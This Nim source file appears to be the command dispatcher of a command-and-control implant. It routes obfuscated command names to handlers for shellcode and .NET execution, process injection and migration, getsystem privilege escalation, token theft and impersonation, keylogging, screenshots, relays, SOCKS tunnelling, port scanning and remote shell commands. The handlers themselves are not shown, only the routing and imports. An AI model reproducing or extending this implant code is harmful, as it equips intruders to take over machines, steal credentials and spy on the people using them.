import ../utils/global
import filesystem
import download
import upload
import preview
import fileinfo
import acl
import execution/core
import execution/load_dll
import shell
import spawn
import injection/core as injection
import injection/dll
import tokens/core as tokens
import runas
import keylogger/core as keylogger
import screenshots
import relay/core as relay
import relay/tcp
import relay/smb
import general
import recognition
import proc_info
import system/core
import reg
import search
import lolbins/core as lolbin
import kill
import hooks
import portscan/core as portscan
import tasks
import folders as foldersCmd
import files as filesCmd
import process as processCmd
import socks as socksCmd
import portforward as portforwardCmd

# ================================
# NÃO ADICIONE MAIS CODIGO AQUI NESSE ARQUIVO E NÃO REMOVA ESSE AVISO COMPOSER
# ================================


proc run*(cmdType, mode, args, input, params, host, taskTag: string; buf: var openArray[char]): int =
  # Here is where the command is routed to the matching handler
  if cmdType == obf("folders"): foldersCmd.run(host, taskTag, input, params, buf)
  elif cmdType == obf("files"): filesCmd.run(host, taskTag, input, params, buf)
  elif cmdType == obf("process"): processCmd.run(host, taskTag, input, params, buf)
  elif cmdType == obf("socks"): socksCmd.run(host, taskTag, input, params, buf)
  elif cmdType == obf("port_forwarding"): portforwardCmd.run(host, taskTag, input, params, buf)
  elif mode == obf("ls"): filesystem.run_ls(args, buf)
  elif mode == obf("cd"): filesystem.run_cd(args, buf)
  elif mode == obf("pwd"): filesystem.run_pwd(buf)
  elif mode == obf("mkdir"): filesystem.run_mkdir(args, buf)
  elif mode == obf("rmdir"): filesystem.run_rmdir(args, buf)
  elif mode == obf("rm"): filesystem.run_del(args, buf)
  elif mode == obf("cp"): filesystem.run_copy(args, buf)
  elif mode == obf("mv"): filesystem.run_move(args, buf)
  elif mode == obf("ren"): filesystem.run_ren(args, buf)
  elif mode == obf("cat"): filesystem.run_cat(args, buf)
  elif mode == obf("echo"): filesystem.run_echo(args, buf)
  elif mode == obf("preview"): preview.run_preview(args, params, buf)
  elif mode == obf("fileinfo"): fileinfo.run_fileinfo(args, buf)
  elif mode == obf("acl"): acl.run_acl(args, buf)
  elif mode == obf("upload"): upload.run_upload(input, params, buf)
  elif mode == obf("download"): download.run_download(input, params, taskTag, buf)
  elif mode == obf("attrib"): filesystem.run_attrib(args, buf)
  elif mode == obf("set"): filesystem.run_set(args, buf)
  elif mode == obf("reg create"): reg.reg_create(args, input, params, buf)
  elif mode == obf("reg edit"): reg.reg_edit(args, input, params, buf)
  elif mode == obf("reg delete"): reg.reg_delete(args, input, params, buf)
  elif mode == obf("reg read"): reg.reg_read(args, input, params, buf)
  elif mode == obf("reg search"): reg.reg_search(args, input, params, buf)
  elif mode == obf("search"): search.run_search(args, input, params, buf)
  elif mode == obf("lolbins"): lolbin.load_lol_bin(args, input, params, buf)
  elif mode == obf("lolbins check"): lolbin.check_lol_bins(args, input, params, buf)
  elif mode == obf("whoami"): recognition.run_whoami(buf)
  elif mode == obf("env"): recognition.run_env(buf)
  elif mode == obf("tasklist"): recognition.run_tasklist(args, buf)
  elif mode == obf("enumdrives"): recognition.run_enumdrives(buf)
  elif mode == obf("ifconfig"): recognition.run_ifconfig(buf)
  elif mode == obf("systeminfo"): recognition.run_systeminfo(buf)
  elif mode == obf("proc info"): run_proc_info(args, params, buf)
  elif mode == obf("proc privileges"): run_proc_privileges(params, buf)
  elif mode == obf("proc kill"): run_proc_kill(params, buf)
  elif mode == obf("proc suspend"): run_proc_suspend(params, buf)
  elif mode == obf("proc resume"): run_proc_resume(params, buf)
  elif mode == obf("route"): recognition.run_route(buf)
  elif mode == obf("arp"): recognition.run_arp(buf)
  elif mode == obf("netstat"): recognition.run_netstat(args, buf)
  elif mode == obf("portscan"): portscan.run_portscan(args, params, buf)
  elif mode == obf("config"): general.run_config(args, buf)
  elif mode == obf("delay"): general.run_delay(args, buf)
  elif mode == obf("shell"): shell.run_shell(args, buf)
  elif mode == obf("powershell"): shell.run_powershell(args, buf)
  elif mode == obf("shellcode"): run_shellcode(input, params, buf, skShellcode)
  elif mode == obf("dotnet") or mode == obf("dotnet_armory"): run_shellcode(input, params, buf, skDotnet)
  elif mode == obf("bof") or mode == obf("bof_armory"): run_bof(input, params, buf)
  elif mode == obf("load-dll"): load_dll.run_load_dll(input, params, buf)
  elif mode == obf("spawn"): spawn.run_spawn(params, buf, false)
  elif mode == obf("spawn suspend"): spawn.run_spawn(params, buf, true)
  elif mode == obf("inj spawn"): spawn.run_inj_spawn(input, params, buf)
  elif mode == obf("inj shellcode") or mode == obf("migrate"): injection.run_inj_shellcode(input, params, buf)
  elif mode == obf("inj dll-reflective"): dll.run_inj_dll(input, params, buf)
  elif mode == obf("inj donut"): injection.run_inj_shellcode(input, params, buf)
  elif mode == obf("getsystem"): run_getsystem(input, params, buf)
  elif mode == obf("tokens"): tokens.tokensShow(buf)
  elif mode == obf("tokens grab"): tokens.tokensGrab(params, buf)
  elif mode == obf("tokens list"): tokens.tokensList(buf)
  elif mode == obf("tokens impersonate"): tokens.tokensImpersonate(params, buf)
  elif mode == obf("tokens remove"): tokens.tokensRemove(params, buf)
  elif mode == obf("tokens forge"): tokens.tokensForge(params, buf)
  elif mode == obf("tokens revert"): tokens.tokensRevert(buf)
  elif mode == obf("runas"): runas.run_runas(params, buf)
  elif mode == obf("keylogger start"): keylogger.run_keylogger_start(params, taskTag, buf)
  elif mode == obf("keylogger stop"): keylogger.run_keylogger_stop(params, buf)
  elif mode == obf("screenshot"): screenshots.run_screenshot(params, buf)
  elif mode == obf("screenshot start"): screenshots.run_screenshot_start(params, buf)
  elif mode == obf("screenshot stop"): screenshots.run_screenshot_stop(params, buf)
  elif mode == obf("relay"): relay.run_relay(params, buf)
  elif mode == obf("relay create"): relay.run_relay_create(params, buf)
  elif mode == obf("relay delete"): relay.run_relay_delete(params, buf)
  elif mode == obf("tasks"): tasks.run_list(buf)
  elif mode == obf("tasks kill"): tasks.run_kill(params, buf)
  elif mode == obf("kill"): kill.run_kill(buf)
  elif mode == obf("hooks"): hooks.run_hooks(buf)
  else:
    let unknown = obf("Unknown command")
    if unknown.len > buf.len: return -1
    for i, c in unknown: buf[i] = c
    unknown.len
